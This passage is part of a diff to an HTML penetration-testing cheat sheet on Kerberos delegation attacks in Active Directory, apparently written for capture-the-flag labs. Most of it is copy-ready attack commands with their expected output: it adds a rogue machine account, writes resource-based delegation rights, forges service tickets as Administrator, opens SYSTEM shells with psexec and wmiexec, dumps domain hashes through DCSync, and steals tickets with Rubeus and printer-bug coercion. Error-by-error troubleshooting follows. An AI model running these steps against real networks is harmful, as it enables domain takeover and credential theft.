+  -computer-name 'FAKE$' \
+  -computer-pass 'FakePass123!' \
+  -dc-ip $DC_IP
+<span class="c"># Expected: "[*] Successfully added machine account FAKE$ with password FakePass123!"</span>
+
+<span class="c"># Step 2 — Write the RBCD ACE on the target:</span>
+<span class="c"># IMPORTANT: -delegate-to wants SHORT name + $, NOT FQDN.</span>
+<span class="c">#   ✅ -delegate-to 'DC$'</span>
+<span class="c">#   ❌ -delegate-to 'DC.SUPPORT.HTB$'  (will fail "User not found in LDAP")</span>
+impacket-rbcd "$DOMAIN/$USER:$PASS" \
+  -delegate-from 'FAKE$' \
+  -delegate-to "${TARGET_COMP}\$" \
+  -action write \
+  -dc-ip $DC_IP
+<span class="c"># Expected: "[*] Delegation rights modified successfully!"</span>
+
+<span class="c"># Step 3 — Verify ACE landed (optional but recommended):</span>
+impacket-rbcd "$DOMAIN/$USER:$PASS" \
+  -delegate-to "${TARGET_COMP}\$" \
+  -action read \
+  -dc-ip $DC_IP
+<span class="c"># Should show FAKE$ in "Accounts Allowed To Act On Behalf Of Other Identity"</span>
+
+<span class="c"># Step 4 — Request Service Ticket impersonating Administrator:</span>
+<span class="c"># Note: -spn wants FQDN (lowercase preferred), NOT short name + $</span>
+impacket-getST "$DOMAIN/FAKE\$:FakePass123!" \
+  -spn "cifs/${TARGET_FQDN}" \
+  -impersonate Administrator \
+  -dc-ip $DC_IP
+<span class="c"># Expected: "[*] Saving ticket in Administrator@cifs_${TARGET_FQDN}@${REALM}.ccache"</span>
+
+<span class="c"># Step 5 — ⚠️ CRITICAL: point KRB5CCNAME at the EXACT ccache file impacket wrote:</span>
+ls -la *.ccache    <span class="c"># SEE the filename — don't guess</span>
+export KRB5CCNAME="$(pwd)/Administrator@cifs_${TARGET_FQDN}@${REALM}.ccache"
+<span class="c"># Adjust the filename to match what ls showed (case can matter — copy exactly).</span>
+
+<span class="c"># Verify ticket loaded:</span>
+klist
+<span class="c"># Should show: Default principal: Administrator@&lt;REALM&gt;</span>
+<span class="c">#              Service principal: cifs/${TARGET_FQDN}@&lt;REALM&gt;</span>
+
+<span class="c"># Step 6 — Use the ticket — shell as SYSTEM on target:</span>
+impacket-psexec -k -no-pass "${TARGET_FQDN}"
+
+<span class="c"># Alternative actions with the CIFS ticket:</span>
+impacket-wmiexec -k -no-pass "${TARGET_FQDN}"
+impacket-smbexec -k -no-pass "${TARGET_FQDN}"</pre></div>
+
+<div class="cb"><div class="cb-head"><span class="cb-lbl">RBCD — different SPN tickets for different end-actions</span><button class="cpb" onclick="cp(this)">copy</button></div>
+<div class="cb-desc"><strong>What this does:</strong> The CIFS ticket only works for SMB-based exec. For DCSync (LDAP-based) or evil-winrm (HTTP-based), you need to request tickets for those specific service classes. Same RBCD ACE already in place — just generate more tickets.</div>
+<pre><span class="c"># For DCSync — uses ldap SPN:</span>
+impacket-getST "$DOMAIN/FAKE\$:FakePass123!" \
+  -spn "ldap/${TARGET_FQDN}" \
+  -impersonate Administrator \
+  -dc-ip $DC_IP
+export KRB5CCNAME="$(pwd)/Administrator@ldap_${TARGET_FQDN}@${REALM}.ccache"
+impacket-secretsdump -k -no-pass "${TARGET_FQDN}" -just-dc-ntlm
+
+<span class="c"># For evil-winrm — uses HTTP SPN:</span>
+impacket-getST "$DOMAIN/FAKE\$:FakePass123!" \
+  -spn "HTTP/${TARGET_FQDN}" \
+  -impersonate Administrator \
+  -dc-ip $DC_IP
+export KRB5CCNAME="$(pwd)/Administrator@HTTP_${TARGET_FQDN}@${REALM}.ccache"
+evil-winrm -i "${TARGET_FQDN}" -r "${REALM}"
+
+<span class="c"># Cleanup (delete the RBCD ACE — leaves environment clean):</span>
+impacket-rbcd "$DOMAIN/$USER:$PASS" \
+  -delegate-to "${TARGET_COMP}\$" \
+  -action flush \
+  -dc-ip $DC_IP</pre></div>
+
+<div class="cb"><div class="cb-head"><span class="cb-lbl">RBCD troubleshooting — common errors</span><button class="cpb" onclick="cp(this)">copy</button></div>
+<div class="cb-desc"><strong>What this does:</strong> Maps every common RBCD error to its fix. Most are quoting, FQDN-vs-short-name, or KRB5CCNAME misconfigurations.</div>
+<pre><span class="c"># ERROR: "User not found in LDAP: DC.X.HTB$"</span>
+<span class="c">#   CAUSE: -delegate-to / -delegate-from wants sAMAccountName, not FQDN</span>
+<span class="c">#   FIX:   Use SHORT name + $ — 'DC$' not 'DC.X.HTB$'</span>
+
+<span class="c"># ERROR: "STATUS_USER_SESSION_DELETED" during getST</span>
+<span class="c">#   CAUSE: Clock skew between you and DC</span>
+<span class="c">#   FIX:   sudo ntpdate $DC_IP   (or: dc-sync $DC_IP)</span>
+
+<span class="c"># ERROR: "share 'ADMIN$' is not writable" after psexec -k</span>
+<span class="c">#   CAUSE: KRB5CCNAME points at wrong/empty ccache OR not set at all</span>
+<span class="c">#   FIX:   ls *.ccache → export KRB5CCNAME=$(pwd)/&lt;actual_filename&gt; → klist to verify</span>
+
+<span class="c"># ERROR: "[Errno 2] No such file or directory: 'X.ccache'"</span>
+<span class="c">#   CAUSE: KRB5CCNAME set to a literal string from a prior run, file doesn't exist</span>
+<span class="c">#   FIX:   unset KRB5CCNAME, re-run getST, then export to the exact written filename</span>
+
+<span class="c"># ERROR: "MachineAccountQuota exceeded" on addcomputer</span>
+<span class="c">#   CAUSE: ms-DS-MachineAccountQuota = 0 in domain (hardened environment)</span>
+<span class="c">#   FIX:   Verify quota: nxc ldap $DC_IP -u $USER -p "$PASS" -M maq</span>
+<span class="c">#          If 0, you need an account with explicit Create Computer rights, or pivot to other path</span>
+
+<span class="c"># ERROR: getST hangs forever</span>
+<span class="c">#   CAUSE: DNS resolution — DC_HOST not in /etc/hosts</span>
+<span class="c">#   FIX:   echo "$DC_IP $DC_HOST $DOMAIN" | sudo tee -a /etc/hosts</span>
+
+<span class="c"># ERROR: -delegate-to '$TARGET_COMP$' fails with literal string error</span>
+<span class="c">#   CAUSE: Single quotes prevent bash variable expansion</span>
+<span class="c">#   FIX:   Use double quotes with escaped $: "${TARGET_COMP}\$"</span></pre></div>
+
+<h3 style="margin:1.2rem 0 0.5rem;font-size:0.95rem;color:#58a6ff;">Type 1 — Unconstrained Delegation</h3>
+<div class="cb"><div class="cb-head"><span class="cb-lbl">USE WHEN: NON-DC machine flagged unconstrained AND you have local admin shell on it</span><div class="cb-tags"><span class="tag t-crit">most dangerous</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+<div class="cb-desc"><strong>What this does:</strong> Machine stores ANY user's full TGT when they authenticate to it. Any DA who connects → their TGT lands in LSASS on that machine. If you have local admin → steal DA TGT → own domain.</div>
+<pre><span class="c"># PREREQS — verify before starting:</span>
+<span class="c">#   ☑ Target is NOT a DC (DCs are default unconstrained — not a finding)</span>
+<span class="c">#   ☑ You have local admin SHELL on the unconstrained machine</span>
+<span class="c">#   ☑ A DA either logs in periodically OR you can coerce one</span>
+
+<span class="c"># FIND non-DC unconstrained hosts:</span>
+impacket-findDelegation $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP | grep -v "Domain Controllers"
+
+<span class="c"># BloodHound (excluding DCs which are normal):</span>
+MATCH (c:Computer {unconstraineddelegation:true})
+WHERE NOT (c)-[:MemberOf]->(:Group {name:"DOMAIN CONTROLLERS@$REALM"})
+RETURN c.name
+
+<span class="c"># EXPLOIT — Option A: wait for DA to naturally authenticate</span>
 <span class="c"># Get shell on the unconstrained machine first, then monitor:</span>
 .\Rubeus.exe monitor /interval:5 /nowrap
-<span class="c"># Wait — when DA connects their TGT appears in output</span>
-<span class="c"># Copy the base64 ticket, inject it:</span>
+<span class="c"># Wait — when DA connects their TGT appears as base64 in output</span>
+<span class="c"># Copy the ticket, inject:</span>
 .\Rubeus.exe ptt /ticket:$B64TGT
 <span class="c"># Now authenticated as DA — DCSync:</span>
 impacket-secretsdump $DOMAIN/$DA_USER@$DC_IP -k -no-pass
 
-<span class="c"># EXPLOIT — Option B: coerce DC to authenticate (don't wait):</span>
+<span class="c"># EXPLOIT — Option B: coerce DC to authenticate (don't wait)</span>
 <span class="c"># Start monitoring on unconstrained machine:</span>
 .\Rubeus.exe monitor /interval:5 /nowrap
-<span class="c"># From kali — force DC to authenticate to your unconstrained machine:</span>
+<span class="c"># From Kali — force DC to authenticate to your unconstrained machine:</span>
 python3 printerbug.py $DOMAIN/$USER:"$PASS"@$DC_IP $UNCON_IP
 <span class="c"># DC machine account TGT lands immediately</span>
-<span class="c"># Extract + use it for secretsdump</span></pre></div>
+<span class="c"># Extract + use it for secretsdump as $DC_HOST machine account</span></pre></div>
 
-      <div class="cb"><div class="cb-head"><span class="cb-lbl">type 2 — constrained delegation</span><button class="cpb" onclick="cp(this)">copy</button></div>
-        <pre><span class="c"># WHAT IT IS:</span>
-<span class="c"># Account can impersonate users but ONLY to specific services</span>
-<span class="c"># e.g. svc_web can impersonate users to MSSQLSvc/db01:1433 ONLY</span>
-<span class="c"># Key: can impersonate ANY user including Administrator to allowed services</span>
-<span class="c">#</span>
-<span class="c"># FIND IT:</span>
-impacket-findDelegation $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP
-<span class="c"># Look for: "Constrained" — note the allowed service in the AllowedProtocol column</span>
+<h3 style="margin:1.2rem 0 0.5rem;font-size:0.95rem;color:#58a6ff;">Type 2 — Constrained Delegation (S4U2Self / S4U2Proxy)</h3>
+<div class="cb"><div class="cb-head"><span class="cb-lbl">USE WHEN: You own creds/hash of an account with msDS-AllowedToDelegateTo set</span><button class="cpb" onclick="cp(this)">copy</button></div>
+<div class="cb-desc"><strong>What this does:</strong> Account with constrained delegation can request tickets impersonating any user TO specific services (the AllowedToDelegateTo list). You own the SOURCE — execute S4U2Self → S4U2Proxy chain to get Administrator tickets to target services.</div>
+<pre><span class="c"># PREREQS — verify before starting:</span>
+<span class="c">#   ☑ You own credentials (password or hash) of a principal with constrained delegation set</span>
+<span class="c">#   ☑ The AllowedToDelegateTo list contains a service you care about</span>
 
-<span class="c"># EXPLOIT — request service ticket AS Administrator to allowed service:</span>
-<span class="c"># Step 1 — get TGT for the account with constrained delegation:</span>
-impacket-getTGT $DOMAIN/svc_web:"$PASS" -dc-ip $DC_IP
-export KRB5CCNAME=svc_web.ccache
+<span class="c"># Find constrained delegation targets:</span>
+impacket-findDelegation $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP | grep "Constrained"
 
-<span class="c"># Step 2 — request TGS impersonating Administrator to allowed service:</span>
-impacket-getST $DOMAIN/svc_web:"$PASS" \
-  -spn MSSQLSvc/db01.corp.local:1433 \
+<span class="c"># BloodHound:</span>
+MATCH p=(u)-[:AllowedToDelegate]->(c:Computer) RETURN u.name, c.name
+
+<span class="c"># EXPLOIT — Request ticket impersonating Administrator to allowed service:</span>
+impacket-getST -spn "cifs/$TARGET_FQDN" \
   -impersonate Administrator \
-  -dc-ip $DC_IP
-export KRB5CCNAME=Administrator.ccache
-
-<span class="c"># Step 3 — use it (if allowed service is CIFS you get a shell):</span>
-impacket-psexec -k -no-pass dc01.corp.local
-impacket-secretsdump -k -no-pass dc01.corp.local</pre></div>
-
-      <div class="cb"><div class="cb-head"><span class="cb-lbl">type 3 — resource-based constrained delegation (RBCD)</span><button class="cpb" onclick="cp(this)">copy</button></div>
-        <pre><span class="c"># WHAT IT IS:</span>
-<span class="c"># Target machine controls WHO can delegate TO it (reverse of constrained)</span>
-<span class="c"># If you have GenericWrite on a computer object → configure RBCD yourself</span>
-<span class="c"># Create a fake computer → configure it to delegate to target → impersonate DA</span>
-<span class="c">#</span>
-<span class="c"># PREREQUISITE: GenericWrite on a computer object (BloodHound shows this)</span>
-
-<span class="c"># Step 1 — create a fake computer account (any domain user can do this):</span>
-impacket-addcomputer $DOMAIN/$USER:"$PASS" \
-  -computer-name 'FAKEBOX$' \
-  -computer-pass 'FakePass123!' \
+  "$DOMAIN/$SVC_USER:$PASS" \
   -dc-ip $DC_IP
 
-<span class="c"># Step 2 — configure RBCD on target machine (uses your GenericWrite):</span>
-impacket-rbcd $DOMAIN/$USER:"$PASS" \
-  -delegate-from 'FAKEBOX$' \
-  -delegate-to '$TARGET_COMP$' \
-  -action write \
-  -dc-ip $DC_IP
-
-<span class="c"># Step 3 — get TGT for fake computer:</span>
-impacket-getTGT $DOMAIN/'FAKEBOX$':'FakePass123!' -dc-ip $DC_IP
-export KRB5CCNAME=FAKEBOX\$.ccache
-
-<span class="c"># Step 4 — request service ticket impersonating Administrator to target:</span>
-impacket-getST $DOMAIN/'FAKEBOX$':'FakePass123!' \
-  -spn CIFS/$TARGET_COMP.corp.local \
+<span class="c"># Or with hash:</span>
+impacket-getST -spn "cifs/$TARGET_FQDN" \
   -impersonate Administrator \
+  "$DOMAIN/$SVC_USER" -hashes ":$HASH" \
   -dc-ip $DC_IP
-export KRB5CCNAME=Administrator.ccache
 
-<span class="c"># Step 5 — shell on target as Administrator:</span>
-impacket-psexec -k -no-pass $TARGET_COMP.corp.local</pre></div>
-
-      <div class="sig">
-        <span class="sig-title">output signals</span>
-        <div class="sig-entry">
-          <span class="sig-signal"><span class="sig-label">Signal:</span> findDelegation shows Unconstrained machine</span>
-          <span class="sig-cmd">nxc smb $UNCON_IP -u $USER -p "$PASS" <span class="sig-note">-- confirm local admin first</span></span>
-          <span class="sig-cmd">evil-winrm -i $UNCON_IP -u $USER -p "$PASS" <span class="sig-note">-- get shell, then Rubeus monitor</span></span>
-        </div>
-        <div class="sig-entry">
-          <span class="sig-signal"><span class="sig-label">Signal:</span> Rubeus monitor captures a DA TGT</span>
-          <span class="sig-cmd">.\Rubeus.exe ptt /ticket:$B64 <span class="sig-note">-- inject immediately</span></span>
-          <span class="sig-cmd">impacket-secretsdump $DOMAIN/DA@$DC_IP -k -no-pass <span class="sig-note">-- DCSync with stolen ticket</span></span>
-        </div>
-        <div class="sig-entry">
-          <span class="sig-signal"><span class="sig-label">Signal:</span> findDelegation shows Constrained delegation on svc account</span>
-          <span class="sig-cmd">impacket-getST $DOMAIN/$SVC:"$PASS" -spn $ALLOWED_SPN -impersonate Administrator -dc-ip $DC_IP <span class="sig-note">-- impersonate DA</span></span>
-          <span class="sig-cmd">export KRB5CCNAME=Administrator.ccache && impacket-psexec -k -no-pass $TARGET_HOST <span class="sig-note">-- shell as DA</span></span>
-        </div>
-        <div class="sig-entry">
-          <span class="sig-signal"><span class="sig-label">Signal:</span> BloodHound shows GenericWrite on a computer object</span>
-          <span class="sig-cmd">impacket-addcomputer $DOMAIN/$USER:"$PASS" -computer-name 'FAKEBOX$' -computer-pass 'FakePass123!' -dc-ip $DC_IP <span class="sig-note">-- create fake computer</span></span>
-          <span class="sig-cmd">impacket-rbcd $DOMAIN/$USER:"$PASS" -delegate-from 'FAKEBOX$' -delegate-to '$TARGET$' -action write -dc-ip $DC_IP <span class="sig-note">-- configure RBCD</span></span>
-        </div>
-      </div>
+<span class="c"># Use the ticket:</span>
+export KRB5CCNAME="$(pwd)/Administrator@cifs_${TARGET_FQDN}@${REALM}.ccache"
+impacket-psexec -k -no-pass "$TARGET_FQDN"</pre></div>
 </div>
 </details>
 <details class="sec-detail" id="coerce">
